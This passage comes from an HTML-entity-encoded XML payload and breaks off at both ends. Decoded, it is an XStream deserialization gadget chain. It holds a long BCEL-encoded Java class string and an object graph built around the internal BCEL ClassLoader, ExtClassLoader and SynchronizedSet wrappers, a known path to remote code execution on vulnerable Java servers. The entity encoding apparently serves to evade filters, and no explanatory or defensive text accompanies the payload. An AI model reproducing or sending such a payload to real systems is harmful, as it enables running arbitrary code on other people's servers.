24;&#x63;&#x37;&#x24;&#x58;&#x24;&#x77;&#x24;&#x62;&#x65;&#x34;&#x24;&#x66;&#x30;&#x24;&#x56;&#x24;&#x62;&#x65;&#x24;&#x39;&#x36;&#x64;&#x24;&#x37;&#x64;&#x24;&#x61;&#x33;&#x24;&#x61;&#x30;&#x24;&#x65;&#x31;&#x64;&#x24;&#x62;&#x66;&#x24;&#x38;&#x31;&#x6f;&#x24;&#x66;&#x31;&#x24;&#x39;&#x64;&#x24;&#x38;&#x31;&#x24;&#x65;&#x66;&#x71;&#x24;&#x63;&#x39;&#x24;&#x63;&#x30;&#x24;&#x50;&#x24;&#x66;&#x38;&#x51;&#x24;&#x42;&#x58;&#x24;&#x62;&#x66;&#x24;&#x33;&#x61;&#x24;&#x46;&#x32;&#x24;&#x66;&#x30;&#x24;&#x54;&#x36;&#x24;&#x64;&#x33;&#x24;&#x66;&#x64;&#x52;&#x24;&#x62;&#x62;&#x24;&#x78;&#x24;&#x65;&#x38;&#x24;&#x62;&#x61;&#x53;&#x24;&#x38;&#x66;&#x24;&#x77;&#x24;&#x65;&#x38;&#x24;&#x62;&#x63;&#x43;&#x24;&#x64;&#x66;&#x55;&#x24;&#x63;&#x35;&#x24;&#x33;&#x63;&#x36;&#x24;&#x65;&#x33;&#x31;&#x24;&#x52;&#x24;&#x57;&#x24;&#x62;&#x65;&#x24;&#x64;&#x32;&#x24;&#x63;&#x66;&#x24;&#x38;&#x62;&#x24;&#x66;&#x62;&#x35;&#x24;&#x66;&#x31;&#x24;&#x65;&#x65;&#x24;&#x66;&#x34;&#x4a;&#x24;&#x55;&#x24;&#x66;&#x62;&#x24;&#x61;&#x33;&#x43;&#x24;&#x39;&#x36;&#x24;&#x63;&#x36;&#x75;&#x24;&#x37;&#x63;&#x24;&#x62;&#x31;&#x24;&#x65;&#x30;&#x24;&#x48;&#x65;&#x48;&#x24;&#x62;&#x62;&#x65;&#x24;&#x57;&#x62;&#x55;&#x24;&#x66;&#x30;&#x65;&#x47;&#x52;&#x24;&#x61;&#x37;&#x24;&#x65;&#x65;&#x24;&#x42;&#x24;&#x64;&#x33;&#x24;&#x63;&#x38;&#x24;&#x66;&#x32;&#x24;&#x72;&#x24;&#x39;&#x30;&#x24;&#x75;&#x24;&#x64;&#x38;&#x24;&#x55;&#x24;&#x61;&#x66;&#x24;&#x65;&#x64;&#x24;&#x65;&#x33;&#x24;&#x67;&#x24;&#x38;&#x62;&#x24;&#x37;&#x64;&#x65;&#x24;&#x65;&#x36;&#x24;&#x58;&#x24;&#x66;&#x33;&#x24;&#x64;&#x62;&#x24;&#x35;&#x62;&#x47;&#x24;&#x65;&#x37;&#x44;&#x24;&#x38;&#x64;&#x4e;&#x24;&#x66;&#x37;&#x24;&#x64;&#x64;&#x24;&#x61;&#x36;&#x24;&#x62;&#x38;&#x24;&#x64;&#x31;&#x76;&#x24;&#x65;&#x36;&#x24;&#x64;&#x63;&#x59;&#x24;&#x62;&#x36;&#x24;&#x66;&#x30;&#x24;&#x61;&#x65;&#x78;&#x24;&#x65;&#x64;&#x24;&#x66;&#x38;&#x24;&#x39;&#x65;&#x24;&#x61;&#x38;&#x24;&#x56;&#x75;&#x24;&#x64;&#x37;&#x24;&#x68;&#x72;&#x4d;&#x72;&#x52;&#x4e;&#x24;&#x61;&#x33;&#x24;&#x62;&#x64;&#x24;&#x39;&#x36;&#x24;&#x47;&#x39;&#x54;&#x24;&#x45;&#x64;&#x24;&#x38;&#x61;&#x79;&#x24;&#x65;&#x31;&#x59;&#x65;&#x54;&#x24;&#x68;&#x24;&#x66;&#x37;&#x24;&#x38;&#x33;&#x24;&#x38;&#x32;&#x24;&#x68;&#x4f;&#x4c;&#x55;&#x24;&#x77;&#x24;&#x64;&#x32;&#x24;&#x37;&#x62;&#x24;&#x38;&#x66;&#x24;&#x66;&#x63;&#x57;&#x24;&#x35;&#x65;&#x24;&#x69;&#x24;&#x7a;&#x24;&#x46;&#x24;&#x65;&#x31;&#x24;&#x66;&#x37;&#x24;&#x35;&#x62;&#x24;&#x39;&#x36;&#x24;&#x75;&#x24;&#x55;&#x24;&#x65;&#x63;&#x24;&#x66;&#x32;&#x4d;&#x24;&#x59;&#x24;&#x39;&#x66;&#x24;&#x39;&#x30;&#x24;&#x64;&#x37;&#x67;&#x24;&#x38;&#x38;&#x24;&#x39;&#x36;&#x24;&#x56;&#x6c;&#x24;&#x61;&#x65;&#x24;&#x39;&#x33;&#x4c;&#x24;&#x64;&#x64;&#x24;&#x63;&#x38;&#x24;&#x70;&#x24;&#x66;&#x33;&#x24;&#x62;&#x32;&#x24;&#x63;&#x31;&#x59;&#x24;&#x61;&#x31;&#x7a;&#x24;&#x64;&#x65;&#x24;&#x63;&#x37;&#x24;&#x58;&#x24;&#x68;&#x39;&#x24;&#x39;&#x30;&#x24;&#x6b;&#x24;&#x7a;&#x24;&#x33;&#x61;&#x24;&#x62;&#x65;&#x24;&#x39;&#x64;&#x24;&#x61;&#x62;&#x24;&#x64;&#x63;&#x53;&#x4b;&#x24;&#x39;&#x62;&#x24;&#x38;&#x65;&#x24;&#x61;&#x61;&#x24;&#x37;&#x63;&#x24;&#x78;&#x62;&#x24;&#x67;&#x24;&#x4f;&#x24;&#x38;&#x62;&#x24;&#x46;&#x61;&#x71;&#x24;&#x66;&#x34;&#x24;&#x65;&#x66;&#x24;&#x39;&#x31;&#x24;&#x64;&#x35;&#x24;&#x52;&#x24;&#x63;&#x66;&#x24;&#x39;&#x35;&#x24;&#x76;&#x24;&#x66;&#x34;&#x55;&#x79;&#x24;&#x61;&#x61;&#x24;&#x49;&#x39;&#x24;&#x38;&#x36;&#x24;&#x66;&#x34;&#x74;&#x24;&#x63;&#x30;&#x24;&#x63;&#x39;&#x24;&#x58;&#x24;&#x37;&#x64;&#x6a;&#x24;&#x4b;&#x33;&#x24;&#x63;&#x37;&#x24;&#x38;&#x36;&#x24;&#x35;&#x65;&#x24;&#x66;&#x34;&#x24;&#x63;&#x36;&#x24;&#x64;&#x31;&#x24;&#x35;&#x63;&#x76;&#x24;&#x34;&#x30;&#x24;&#x66;&#x35;&#x24;&#x61;&#x65;&#x78;&#x24;&#x64;&#x64;&#x24;&#x44;&#x24;&#x39;&#x39;&#x24;&#x38;&#x33;&#x51;&#x24;&#x79;&#x24;&#x38;&#x38;&#x41;&#x24;&#x39;&#x31;&#x24;&#x62;&#x35;&#x73;&#x24;&#x65;&#x35;&#x51;&#x24;&#x62;&#x65;&#x4b;&#x48;&#x24;&#x78;&#x24;&#x61;&#x65;&#x4a;&#x75;&#x24;&#x63;&#x36;&#x24;&#x79;&#x24;&#x38;&#x63;&#x24;&#x62;&#x32;&#x24;&#x63;&#x66;&#x24;&#x38;&#x33;&#x24;&#x39;&#x66;&#x24;&#x61;&#x36;&#x24;&#x4a;&#x24;&#x65;&#x36;&#x24;&#x65;&#x34;&#x24;&#x45;&#x24;&#x39;&#x62;&#x24;&#x65;&#x61;&#x24;&#x63;&#x31;&#x58;&#x24;&#x62;&#x61;&#x72;&#x24;&#x35;&#x62;&#x24;&#x66;&#x33;&#x24;&#x37;&#x63;&#x24;&#x66;&#x31;&#x24;&#x38;&#x33;&#x24;&#x64;&#x62;&#x73;&#x24;&#x63;&#x63;&#x33;&#x24;&#x7a;&#x24;&#x38;&#x31;&#x24;&#x38;&#x64;&#x78;&#x24;&#x38;&#x34;&#x24;&#x33;&#x66;&#x24;&#x61;&#x33;&#x24;&#x66;&#x32;&#x24;&#x61;&#x66;&#x24;&#x38;&#x31;&#x24;&#x64;&#x33;&#x24;&#x63;&#x63;&#x6b;&#x24;&#x39;&#x31;&#x24;&#x65;&#x62;&#x24;&#x57;&#x24;&#x65;&#x65;&#x24;&#x39;&#x32;&#x24;&#x37;&#x63;&#x72;&#x24;&#x63;&#x30;&#x24;&#x52;&#x24;&#x65;&#x39;&#x24;&#x62;&#x39;&#x24;&#x47;&#x24;&#x65;&#x35;&#x6a;&#x70;&#x24;&#x69;&#x24;&#x65;&#x37;&#x24;&#x64;&#x61;&#x24;&#x59;&#x24;&#x49;&#x24;&#x39;&#x62;&#x24;&#x64;&#x30;&#x24;&#x63;&#x64;&#x24;&#x64;&#x35;&#x24;&#x75;&#x24;&#x44;&#x24;&#x64;&#x30;&#x24;&#x38;&#x33;&#x24;&#x61;&#x64;&#x24;&#x37;&#x63;&#x6a;&#x24;&#x64;&#x38;&#x24;&#x62;&#x36;&#x24;&#x61;&#x38;&#x24;&#x61;&#x63;&#x24;&#x64;&#x63;&#x24;&#x6f;&#x4e;&#x24;&#x61;&#x37;&#x24;&#x65;&#x63;&#x24;&#x39;&#x66;&#x24;&#x65;&#x62;&#x68;&#x24;&#x75;&#x24;&#x6e;&#x24;&#x55;&#x24;&#x4e;&#x24;&#x39;&#x37;&#x24;&#x51;&#x39;&#x24;&#x64;&#x34;&#x24;&#x54;&#x6d;&#x24;&#x4d;&#x24;&#x64;&#x64;&#x24;&#x38;&#x34;&#x5a;&#x24;&#x38;&#x32;&#x24;&#x39;&#x36;&#x24;&#x64;&#x65;&#x24;&#x61;&#x61;&#x24;&#x66;&#x30;&#x24;&#x61;&#x64;&#x24;&#x61;&#x39;&#x24;&#x45;&#x24;&#x37;&#x64;&#x64;&#x24;&#x35;&#x62;&#x24;&#x4a;&#x24;&#x63;&#x64;&#x24;&#x72;&#x24;&#x59;&#x24;&#x64;&#x31;&#x24;&#x39;&#x36;&#x24;&#x53;&#x56;&#x24;&#x38;&#x64;&#x24;&#x66;&#x36;&#x24;&#x53;&#x24;&#x64;&#x37;&#x24;&#x64;&#x61;&#x4b;&#x51;&#x24;&#x35;&#x62;&#x24;&#x77;&#x24;&#x69;&#x24;&#x65;&#x33;&#x24;&#x37;&#x62;&#x73;&#x74;&#x75;&#x45;&#x24;&#x70;&#x24;&#x56;&#x24;&#x38;&#x39;&#x45;&#x62;&#x24;&#x65;&#x31;&#x24;&#x38;&#x61;&#x24;&#x64;&#x32;&#x5f;&#x24;&#x38;&#x38;&#x24;&#x61;&#x36;&#x24;&#x67;&#x63;&#x24;&#x38;&#x64;&#x24;&#x64;&#x31;&#x24;&#x66;&#x36;&#x24;&#x53;&#x24;&#x64;&#x36;&#x48;&#x24;&#x66;&#x64;&#x68;&#x47;&#x24;&#x39;&#x38;&#x24;&#x61;&#x38;&#x24;&#x65;&#x33;&#x24;&#x61;&#x31;&#x24;&#x65;&#x38;&#x24;&#x64;&#x61;&#x24;&#x38;&#x63;&#x24;&#x38;&#x34;&#x24;&#x61;&#x61;&#x31;&#x75;&#x24;&#x68;&#x24;&#x46;&#x4d;&#x24;&#x55;&#x74;&#x66;&#x24;&#x43;&#x24;&#x66;&#x38;&#x24;&#x64;&#x61;&#x24;&#x39;&#x34;&#x24;&#x66;&#x36;&#x24;&#x33;&#x62;&#x24;&#x62;&#x61;&#x24;&#x38;&#x65;&#x5f;&#x47;&#x24;&#x79;&#x24;&#x61;&#x36;&#x24;&#x39;&#x35;&#x24;&#x62;&#x30;&#x24;&#x61;&#x65;&#x24;&#x38;&#x34;&#x24;&#x66;&#x35;&#x24;&#x64;&#x37;&#x24;&#x62;&#x30;&#x24;&#x6e;&#x7a;&#x5f;&#x24;&#x4a;&#x24;&#x66;&#x37;&#x24;&#x61;&#x37;&#x24;&#x39;&#x61;&#x62;&#x24;&#x38;&#x64;&#x31;&#x24;&#x64;&#x61;&#x24;&#x37;&#x63;&#x24;&#x65;&#x30;&#x24;&#x53;&#x24;&#x39;&#x61;&#x24;&#x65;&#x35;&#x24;&#x66;&#x33;&#x24;&#x63;&#x31;&#x24;&#x78;&#x24;&#x38;&#x38;&#x44;&#x37;&#x24;&#x64;&#x32;&#x24;&#x65;&#x65;&#x24;&#x56;&#x68;&#x24;&#x38;&#x37;&#x7a;&#x4a;&#x78;&#x24;&#x66;&#x38;&#x6a;&#x24;&#x39;&#x30;&#x24;&#x65;&#x33;&#x24;&#x4e;&#x24;&#x66;&#x63;&#x24;&#x63;&#x31;&#x24;&#x5f;&#x24;&#x38;&#x31;&#x50;&#x24;&#x63;&#x30;&#x24;&#x63;&#x30;&#x30;&#x56;&#x24;&#x48;&#x24;&#x62;&#x39;&#x24;&#x68;&#x68;&#x41;&#x24;&#x74;&#x56;&#x24;&#x39;&#x31;&#x24;&#x63;&#x30;&#x56;&#x24;&#x71;&#x24;&#x64;&#x30;&#x24;&#x38;&#x36;&#x24;&#x39;&#x64;&#x24;&#x39;&#x34;&#x24;&#x61;&#x37;&#x24;&#x66;&#x38;&#x24;&#x62;&#x31;&#x71;&#x24;&#x51;&#x24;&#x65;&#x64;&#x24;&#x39;&#x38;&#x24;&#x63;&#x30;&#x24;&#x67;&#x24;&#x39;&#x38;&#x24;&#x65;&#x38;&#x24;&#x34;&#x30;&#x24;&#x52;&#x6b;&#x79;&#x6d;&#x77;&#x24;&#x65;&#x32;&#x32;&#x24;&#x33;&#x66;&#x24;&#x76;&#x6e;&#x24;&#x36;&#x30;&#x24;&#x33;&#x64;&#x24;&#x61;&#x64;&#x24;&#x63;&#x34;&#x70;&#x24;&#x54;&#x24;&#x65;&#x62;&#x24;&#x66;&#x30;&#x37;&#x36;&#x24;&#x45;&#x24;&#x4d;&#x24;&#x65;&#x36;&#x24;&#x64;&#x31;&#x4c;&#x24;&#x33;&#x62;&#x24;&#x62;&#x66;&#x24;&#x61;&#x30;&#x24;&#x39;&#x37;&#x24;&#x57;&#x24;&#x51;&#x24;&#x65;&#x30;&#x24;&#x39;&#x32;&#x24;&#x64;&#x38;&#x4e;&#x24;&#x38;&#x66;&#x24;&#x68;&#x79;&#x24;&#x63;&#x37;&#x24;&#x65;&#x65;&#x24;&#x63;&#x30;&#x24;&#x61;&#x33;&#x24;&#x65;&#x34;&#x24;&#x33;&#x63;&#x24;&#x63;&#x31;&#x24;&#x39;&#x62;&#x24;&#x37;&#x63;&#x24;&#x74;&#x24;&#x33;&#x66;&#x24;&#x38;&#x62;&#x42;&#x24;&#x62;&#x34;&#x24;&#x37;&#x64;&#x24;&#x42;&#x24;&#x38;&#x66;&#x53;&#x24;&#x57;&#x24;&#x61;&#x36;&#x24;&#x48;&#x24;&#x58;&#x4f;&#x24;&#x51;&#x24;&#x58;&#x24;&#x61;&#x31;&#x24;&#x39;&#x66;&#x53;&#x78;&#x24;&#x53;&#x4f;&#x24;&#x39;&#x31;&#x24;&#x65;&#x64;&#x24;&#x6f;&#x24;&#x47;&#x24;&#x62;&#x31;&#x24;&#x38;&#x62;&#x32;&#x24;&#x39;&#x35;&#x24;&#x66;&#x65;&#x24;&#x62;&#x36;&#x24;&#x54;&#x24;&#x64;&#x62;&#x24;&#x63;&#x37;&#x7a;&#x24;&#x35;&#x63;&#x24;&#x61;&#x36;&#x24;&#x63;&#x35;&#x24;&#x64;&#x64;&#x78;&#x24;&#x39;&#x61;&#x24;&#x64;&#x35;&#x24;&#x62;&#x61;&#x49;&#x24;&#x61;&#x64;&#x24;&#x33;&#x64;&#x78;&#x24;&#x38;&#x36;&#x24;&#x33;&#x65;&#x24;&#x66;&#x36;&#x24;&#x66;&#x32;&#x24;&#x66;&#x66;&#x34;&#x24;&#x63;&#x32;&#x24;&#x62;&#x37;&#x24;&#x66;&#x31;&#x24;&#x78;&#x74;&#x24;&#x56;&#x24;&#x66;&#x64;&#x24;&#x77;&#x24;&#x66;&#x36;&#x24;&#x61;&#x39;&#x24;&#x59;&#x50;&#x31;&#x24;&#x59;&#x24;&#x61;&#x63;&#x24;&#x37;&#x63;&#x24;&#x6c;&#x24;&#x4b;&#x24;&#x64;&#x36;&#x61;&#x24;&#x56;&#x24;&#x63;&#x66;&#x42;&#x24;&#x65;&#x31;&#x24;&#x65;&#x65;&#x36;&#x24;&#x38;&#x33;&#x24;&#x62;&#x39;&#x24;&#x58;&#x24;&#x61;&#x65;&#x24;&#x6e;&#x24;&#x64;&#x38;&#x24;&#x4e;&#x24;&#x64;&#x66;&#x66;&#x24;&#x33;&#x63;&#x24;&#x39;&#x30;&#x4a;&#x24;&#x66;&#x62;&#x24;&#x63;&#x33;&#x54;&#x24;&#x33;&#x61;&#x24;&#x51;&#x74;&#x24;&#x63;&#x63;&#x24;&#x63;&#x31;&#x24;&#x66;&#x66;&#x24;&#x41;&#x24;&#x54;&#x24;&#x62;&#x35;&#x6c;&#x24;&#x37;&#x65;&#x24;&#x64;&#x37;&#x24;&#x4a;&#x24;&#x41;&#x24;&#x41;&#x0a;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x61;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6f;&#x75;&#x74;&#x65;&#x72;&#x2d;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6e;&#x61;&#x6d;&#x65;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x6f;&#x72;&#x43;&#x4c;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x73;&#x75;&#x6e;&#x2e;&#x6d;&#x69;&#x73;&#x63;&#x2e;&#x4c;&#x61;&#x75;&#x6e;&#x63;&#x68;&#x65;&#x72;&#x24;&#x45;&#x78;&#x74;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x32;&#x63;&#x65;&#x72;&#x74;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x68;&#x61;&#x73;&#x68;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x65;&#x73;&#x20;&#x64;&#x65;&#x66;&#x69;&#x6e;&#x65;&#x64;&#x2d;&#x69;&#x6e;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x6c;&#x61;&#x6e;&#x67;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x44;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x72;&#x69;&#x6e;&#x63;&#x69;&#x70;&#x61;&#x6c;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x68;&#x61;&#x73;&#x41;&#x6c;&#x6c;&#x50;&#x65;&#x72;&#x6d;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x68;&#x61;&#x73;&#x41;&#x6c;&#x6c;&#x50;&#x65;&#x72;&#x6d;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x50;&#x65;&#x72;&#x6d;&#x69;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x73;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x50;&#x65;&#x72;&#x6d;&#x69;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6b;&#x65;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6b;&#x65;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x44;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x3e;&#x0a;&#x3c;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x24;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x53;&#x65;&#x74;&#x22;&#x20;&#x73;&#x65;&#x72;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x63;&#x75;&#x73;&#x74;&#x6f;&#x6d;&#x22;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x5f;&#x2d;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x73;&#x65;&#x74;&#x22;&#x3e;&#x3c;&#x2f;&#x63;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6d;&#x75;&#x74;&#x65;&#x78;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x24;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x53;&#x65;&#x74;&#x22;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x22;&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x22;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x5f;&#x2d;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x73;&#x3e;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6e;&#x61;&#x74;&#x69;&#x76;&#x65;&#x4c;&#x69;&#x62;&#x72;&#x61;&#x72;&#x69;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x61;&#x73;&#x73;&#x65;&#x72;&#x74;&#x69;&#x6f;&#x6e;&#x4c;&#x6f;&#x63;&#x6b;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e